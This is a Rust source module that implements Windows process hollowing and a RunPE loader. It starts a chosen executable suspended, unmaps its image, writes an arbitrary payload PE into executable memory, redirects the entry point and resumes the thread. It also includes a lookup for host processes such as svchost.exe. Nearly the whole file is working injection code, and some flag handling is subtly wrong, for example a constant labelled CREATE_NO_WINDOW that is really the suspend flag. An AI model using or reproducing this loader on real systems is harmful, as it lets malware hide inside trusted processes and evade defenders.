#[cfg(target_os = "windows")]
use windows::{
    Win32::System::Threading::{
        CreateProcessW, ResumeThread, PROCESS_INFORMATION, STARTUPINFOW,
        CREATE_SUSPENDED, PROCESS_CREATION_FLAGS,
    },
    Win32::System::Diagnostics::Debug::{CONTEXT, GetThreadContext, SetThreadContext, WriteProcessMemory, ReadProcessMemory},
    Win32::System::Memory::{
        VirtualAllocEx, VirtualFreeEx,
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
        MEM_RELEASE, MEMORY_BASIC_INFORMATION, VirtualQueryEx,
        VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS,
    },
    Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    },
    Win32::System::ProcessStatus::{
        EnumProcessModules, GetModuleFileNameExW, GetModuleInformation,
        MODULEINFO,
    },
    Win32::System::Memory::{GetProcessHeap, HeapAlloc, HEAP_ZERO_MEMORY},
    Win32::System::LibraryLoader::GetProcAddress,
    Win32::System::SystemInformation::GetSystemInfo,
    Win32::System::Threading::{
        PROCESS_ACCESS_RIGHTS, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
        THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
        OpenProcess, TerminateProcess,
    },
    Win32::Foundation::{HMODULE, HANDLE, CloseHandle, BOOL, GetLastError},
};
use std::mem::{size_of, zeroed};
use serde::{Deserialize, Serialize};
use thiserror::Error;

#[derive(Debug, Error)]
pub enum HollowingError {
    #[error("Windows API error: {0}")]
    WinApi(String),
    #[error("PE parsing error: {0}")]
    PeParse(String),
    #[error("Memory operation failed: {0}")]
    MemoryOp(String),
    #[error("Invalid PE image")]
    InvalidPe,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HollowingResult {
    pub success: bool,
    pub target_process: String,
    pub pid: u32,
    pub tid: u32,
    pub image_base: u64,
    pub entry_point: u64,
    pub technique: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RunPeConfig {
    pub target_exe: String,
    pub payload_path: String,
    pub create_suspended: bool,
    pub unpatch_ntdll: bool,
    pub randomize_dll_name: bool,
}

pub struct ProcessHollower;

impl ProcessHollower {
    /// Classic Process Hollowing: create suspended process, unmap original image, write payload, redirect entry point
    #[cfg(target_os = "windows")]
    pub fn hollow(target_exe: &str, payload: &[u8]) -> Result<HollowingResult, HollowingError> {
        unsafe {
            let mut si: STARTUPINFOW = zeroed();
            si.cb = size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = zeroed();

            let target_wide: Vec<u16> = target_exe
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            let result = CreateProcessW(
                None,
                windows::core::PWSTR::from_raw(target_wide.as_ptr() as *mut u16),
                None,
                None,
                BOOL::from(false),
                CREATE_SUSPENDED,
                None,
                None,
                &si,
                &mut pi,
            );

            if result.is_err() {
                return Err(HollowingError::WinApi(format!(
                    "CreateProcessW failed: {:?}",
                    GetLastError()
                )));
            }

            let pid = pi.dwProcessId;
            let tid = pi.dwThreadId;

            // Get thread context to find PEB address and entry point
            let mut ctx: CONTEXT = zeroed();
            ctx.ContextFlags = windows::Win32::System::Diagnostics::Debug::CONTEXT_FLAGS(0x10007);
            GetThreadContext(pi.hThread, &mut ctx)
                .map_err(|e| HollowingError::WinApi(format!("GetThreadContext: {:?}", e)))?;

            // Read PEB address from context (x64: rdx = PEB)
            #[cfg(target_arch = "x86_64")]
            let peb_addr = ctx.Rdx as usize;
            #[cfg(target_arch = "x86")]
            let peb_addr = ctx.Ebx as usize;

            // Read image base from PEB (offset 0x10 for x64, 0x08 for x86)
            #[cfg(target_arch = "x86_64")]
            let image_base_offset = 0x10usize;
            #[cfg(target_arch = "x86")]
            let image_base_offset = 0x08usize;

            let mut original_image_base: usize = 0;
            ReadProcessMemory(
                pi.hProcess,
                (peb_addr + image_base_offset) as *const _,
                &mut original_image_base as *mut _ as *mut _,
                size_of::<usize>(),
                None,
            )
            .map_err(|e| HollowingError::MemoryOp(format!("ReadProcessMemory PEB: {:?}", e)))?;

            // Parse payload PE headers
            let payload_pe = Self::parse_pe_headers(payload)?;

            // Unmap the original executable image
            let ntdll = Self::get_ntdll_handle()?;
            let nt_unmap = GetProcAddress(ntdll, windows::core::s!("NtUnmapViewOfSection"))
                .ok_or(HollowingError::WinApi("NtUnmapViewOfSection not found".into()))?;

            type NtUnmapViewOfSection = unsafe extern "system" fn(HANDLE, *mut core::ffi::c_void) -> i32;
            let nt_unmap_fn: NtUnmapViewOfSection = std::mem::transmute(nt_unmap);
            let status = nt_unmap_fn(pi.hProcess, original_image_base as *mut _);
            if status < 0 {
                return Err(HollowingError::MemoryOp(format!("NtUnmapViewOfSection: 0x{:X}", status as u32)));
            }

            // Allocate memory at payload's preferred image base
            let alloc_addr = VirtualAllocEx(
                pi.hProcess,
                Some(payload_pe.image_base as *const _),
                payload_pe.image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if alloc_addr.is_null() {
                // Try at any address if preferred base fails
                let fallback = VirtualAllocEx(
                    pi.hProcess,
                    None,
                    payload_pe.image_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                if fallback.is_null() {
                    return Err(HollowingError::MemoryOp("VirtualAllocEx failed".into()));
                }
                // Write headers
                WriteProcessMemory(
                    pi.hProcess,
                    fallback,
                    payload.as_ptr() as *const _,
                    payload_pe.headers_size,
                    None,
                )
                .map_err(|e| HollowingError::MemoryOp(format!("WriteProcessMemory headers: {:?}", e)))?;

                // Write sections
                for section in &payload_pe.sections {
                    WriteProcessMemory(
                        pi.hProcess,
                        (fallback as usize + section.virtual_address) as *mut _,
                        payload[section.raw_offset..section.raw_offset + section.raw_size].as_ptr() as *const _,
                        section.raw_size,
                        None,
                    )
                    .map_err(|e| HollowingError::MemoryOp(format!("WriteProcessMemory section: {:?}", e)))?;
                }

                // Update entry point in context
                let new_entry = fallback as u64 + payload_pe.entry_point_rva as u64;
                #[cfg(target_arch = "x86_64")]
                {
                    ctx.Rcx = new_entry;
                }
                #[cfg(target_arch = "x86")]
                {
                    ctx.Eax = new_entry as u32;
                }
            } else {
                // Write headers at preferred base
                WriteProcessMemory(
                    pi.hProcess,
                    alloc_addr,
                    payload.as_ptr() as *const _,
                    payload_pe.headers_size,
                    None,
                )
                .map_err(|e| HollowingError::MemoryOp(format!("WriteProcessMemory headers: {:?}", e)))?;

                for section in &payload_pe.sections {
                    WriteProcessMemory(
                        pi.hProcess,
                        (alloc_addr as usize + section.virtual_address) as *mut _,
                        payload[section.raw_offset..section.raw_offset + section.raw_size].as_ptr() as *const _,
                        section.raw_size,
                        None,
                    )
                    .map_err(|e| HollowingError::MemoryOp(format!("WriteProcessMemory section: {:?}", e)))?;
                }

                let new_entry = alloc_addr as u64 + payload_pe.entry_point_rva as u64;
                #[cfg(target_arch = "x86_64")]
                {
                    ctx.Rcx = new_entry;
                }
                #[cfg(target_arch = "x86")]
                {
                    ctx.Eax = new_entry as u32;
                }
            }

            // Set the modified thread context
            SetThreadContext(pi.hThread, &ctx)
                .map_err(|e| HollowingError::WinApi(format!("SetThreadContext: {:?}", e)))?;

            // Resume the suspended thread
            ResumeThread(pi.hThread);

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Ok(HollowingResult {
                success: true,
                target_process: target_exe.to_string(),
                pid,
                tid,
                image_base: payload_pe.image_base as u64,
                entry_point: payload_pe.entry_point_rva as u64,
                technique: "Process Hollowing (NtUnmapViewOfSection)".to_string(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn hollow(_target_exe: &str, _payload: &[u8]) -> Result<HollowingResult, HollowingError> {
        Err(HollowingError::WinApi("Process hollowing is Windows-only".into()))
    }

    /// RunPE: write payload into a newly created suspended process via section mapping
    #[cfg(target_os = "windows")]
    pub fn runpe(config: &RunPeConfig, payload: &[u8]) -> Result<HollowingResult, HollowingError> {
        unsafe {
            let mut si: STARTUPINFOW = zeroed();
            si.cb = size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = zeroed();

            let target_wide: Vec<u16> = config
                .target_exe
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            let mut flags = CREATE_SUSPENDED;
            if config.create_suspended {
                flags |= PROCESS_CREATION_FLAGS(0x00000004u32); // CREATE_NO_WINDOW
            }

            CreateProcessW(
                None,
                windows::core::PWSTR::from_raw(target_wide.as_ptr() as *mut u16),
                None,
                None,
                BOOL::from(false),
                flags,
                None,
                None,
                &si,
                &mut pi,
            )
            .map_err(|e| HollowingError::WinApi(format!("CreateProcessW: {:?}", e)))?;

            let payload_pe = Self::parse_pe_headers(payload)?;

            // Allocate memory in target
            let remote_base = VirtualAllocEx(
                pi.hProcess,
                None,
                payload_pe.image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if remote_base.is_null() {
                TerminateProcess(pi.hProcess, 1);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return Err(HollowingError::MemoryOp("VirtualAllocEx failed".into()));
            }

            // Write PE headers
            WriteProcessMemory(
                pi.hProcess,
                remote_base,
                payload.as_ptr() as *const _,
                payload_pe.headers_size,
                None,
            )
            .map_err(|e| HollowingError::MemoryOp(format!("WriteProcessMemory: {:?}", e)))?;

            // Write sections
            for section in &payload_pe.sections {
                WriteProcessMemory(
                    pi.hProcess,
                    (remote_base as usize + section.virtual_address) as *mut _,
                    payload[section.raw_offset..section.raw_offset + section.raw_size].as_ptr() as *const _,
                    section.raw_size,
                    None,
                )
                .map_err(|e| HollowingError::MemoryOp(format!("WriteProcessMemory section: {:?}", e)))?;
            }

            // Get thread context
            let mut ctx: CONTEXT = zeroed();
            ctx.ContextFlags = windows::Win32::System::Diagnostics::Debug::CONTEXT_FLAGS(0x10007);
            GetThreadContext(pi.hThread, &mut ctx)
                .map_err(|e| HollowingError::WinApi(format!("GetThreadContext: {:?}", e)))?;

            // Set new entry point
            let new_entry = remote_base as u64 + payload_pe.entry_point_rva as u64;
            #[cfg(target_arch = "x86_64")]
            {
                ctx.Rcx = new_entry;
            }
            #[cfg(target_arch = "x86")]
            {
                ctx.Eax = new_entry as u32;
            }

            SetThreadContext(pi.hThread, &ctx)
                .map_err(|e| HollowingError::WinApi(format!("SetThreadContext: {:?}", e)))?;

            ResumeThread(pi.hThread);

            let pid = pi.dwProcessId;
            let tid = pi.dwThreadId;

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Ok(HollowingResult {
                success: true,
                target_process: config.target_exe.clone(),
                pid,
                tid,
                image_base: remote_base as u64,
                entry_point: new_entry,
                technique: "RunPE (VirtualAllocEx + SetThreadContext)".to_string(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn runpe(_config: &RunPeConfig, _payload: &[u8]) -> Result<HollowingResult, HollowingError> {
        Err(HollowingError::WinApi("RunPE is Windows-only".into()))
    }

    /// Find a suitable host process for hollowing (e.g., svchost.exe, explorer.exe)
    #[cfg(target_os = "windows")]
    pub fn find_host_process(process_name: &str) -> Option<u32> {
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
            let mut pe: PROCESSENTRY32W = zeroed();
            pe.dwSize = size_of::<PROCESSENTRY32W>() as u32;

            if Process32FirstW(snapshot, &mut pe).is_ok() {
                loop {
                    let name = String::from_utf16_lossy(&pe.szExeFile)
                        .trim_end_matches('\0')
                        .to_lowercase();
                    if name == process_name.to_lowercase() {
                        CloseHandle(snapshot);
                        return Some(pe.th32ProcessID);
                    }
                    if Process32NextW(snapshot, &mut pe).is_err() {
                        break;
                    }
                }
            }
            CloseHandle(snapshot);
            None
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn find_host_process(_process_name: &str) -> Option<u32> {
        None
    }
}

#[derive(Debug, Clone)]
struct ParsedPe {
    image_base: usize,
    image_size: usize,
    entry_point_rva: usize,
    headers_size: usize,
    sections: Vec<ParsedSection>,
}

#[derive(Debug, Clone)]
struct ParsedSection {
    name: String,
    virtual_address: usize,
    virtual_size: usize,
    raw_offset: usize,
    raw_size: usize,
}

impl ProcessHollower {
    fn parse_pe_headers(data: &[u8]) -> Result<ParsedPe, HollowingError> {
        if data.len() < 64 {
            return Err(HollowingError::InvalidPe);
        }

        // DOS header
        let e_lfanew = u32::from_le_bytes([data[60], data[61], data[62], data[63]]) as usize;
        if e_lfanew + 4 > data.len() {
            return Err(HollowingError::InvalidPe);
        }

        // PE signature
        let pe_sig = &data[e_lfanew..e_lfanew + 4];
        if pe_sig != b"PE\0\0" {
            return Err(HollowingError::InvalidPe);
        }

        let coff_offset = e_lfanew + 4;
        let opt_header_offset = coff_offset + 20;

        // Check if PE32+ (x64) or PE32 (x86)
        let magic = u16::from_le_bytes([data[opt_header_offset], data[opt_header_offset + 1]]);
        let is_64 = magic == 0x20b;

        let entry_point_rva = u32::from_le_bytes([
            data[opt_header_offset + 16],
            data[opt_header_offset + 17],
            data[opt_header_offset + 18],
            data[opt_header_offset + 19],
        ]) as usize;

        let (image_base, image_size, headers_size, num_sections, section_offset) = if is_64 {
            let base = usize::from_le_bytes([
                data[opt_header_offset + 24],
                data[opt_header_offset + 25],
                data[opt_header_offset + 26],
                data[opt_header_offset + 27],
                data[opt_header_offset + 28],
                data[opt_header_offset + 29],
                data[opt_header_offset + 30],
                data[opt_header_offset + 31],
            ]);
            let size = u32::from_le_bytes([
                data[opt_header_offset + 56],
                data[opt_header_offset + 57],
                data[opt_header_offset + 58],
                data[opt_header_offset + 59],
            ]) as usize;
            let hdr = u32::from_le_bytes([
                data[opt_header_offset + 60],
                data[opt_header_offset + 61],
                data[opt_header_offset + 62],
                data[opt_header_offset + 63],
            ]) as usize;
            let ns = u16::from_le_bytes([
                data[coff_offset + 2],
                data[coff_offset + 3],
            ]) as usize;
            let so = coff_offset + 20 + 112 + u16::from_le_bytes([
                data[coff_offset + 16],
                data[coff_offset + 17],
            ]) as usize;
            (base, size, hdr, ns, so)
        } else {
            let base = u32::from_le_bytes([
                data[opt_header_offset + 28],
                data[opt_header_offset + 29],
                data[opt_header_offset + 30],
                data[opt_header_offset + 31],
            ]) as usize;
            let size = u32::from_le_bytes([
                data[opt_header_offset + 56],
                data[opt_header_offset + 57],
                data[opt_header_offset + 58],
                data[opt_header_offset + 59],
            ]) as usize;
            let hdr = u32::from_le_bytes([
                data[opt_header_offset + 60],
                data[opt_header_offset + 61],
                data[opt_header_offset + 62],
                data[opt_header_offset + 63],
            ]) as usize;
            let ns = u16::from_le_bytes([
                data[coff_offset + 2],
                data[coff_offset + 3],
            ]) as usize;
            let so = coff_offset + 20 + 96 + u16::from_le_bytes([
                data[coff_offset + 16],
                data[coff_offset + 17],
            ]) as usize;
            (base, size, hdr, ns, so)
        };

        let mut sections = Vec::new();
        for i in 0..num_sections {
            let sec_off = section_offset + i * 40;
            if sec_off + 40 > data.len() {
                break;
            }

            let name_bytes = &data[sec_off..sec_off + 8];
            let name = String::from_utf8_lossy(
                &name_bytes[..name_bytes.iter().position(|&b| b == 0).unwrap_or(8)]
            ).to_string();

            let virtual_size = u32::from_le_bytes([
                data[sec_off + 8], data[sec_off + 9], data[sec_off + 10], data[sec_off + 11],
            ]) as usize;
            let virtual_address = u32::from_le_bytes([
                data[sec_off + 12], data[sec_off + 13], data[sec_off + 14], data[sec_off + 15],
            ]) as usize;
            let raw_size = u32::from_le_bytes([
                data[sec_off + 16], data[sec_off + 17], data[sec_off + 18], data[sec_off + 19],
            ]) as usize;
            let raw_offset = u32::from_le_bytes([
                data[sec_off + 20], data[sec_off + 21], data[sec_off + 22], data[sec_off + 23],
            ]) as usize;

            sections.push(ParsedSection {
                name,
                virtual_address,
                virtual_size,
                raw_offset,
                raw_size,
            });
        }

        Ok(ParsedPe {
            image_base,
            image_size,
            entry_point_rva,
            headers_size,
            sections,
        })
    }

    #[cfg(target_os = "windows")]
    fn get_ntdll_handle() -> Result<HMODULE, HollowingError> {
        use windows::Win32::System::LibraryLoader::GetModuleHandleW;
        let ntdll_name: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
        unsafe {
            GetModuleHandleW(windows::core::PCWSTR::from_raw(ntdll_name.as_ptr()))
                .map_err(|e| HollowingError::WinApi(format!("GetModuleHandleW ntdll: {:?}", e)))
        }
    }

    #[cfg(not(target_os = "windows"))]
    fn get_ntdll_handle() -> Result<HMODULE, HollowingError> {
        Err(HollowingError::WinApi("Not on Windows".into()))
    }
}
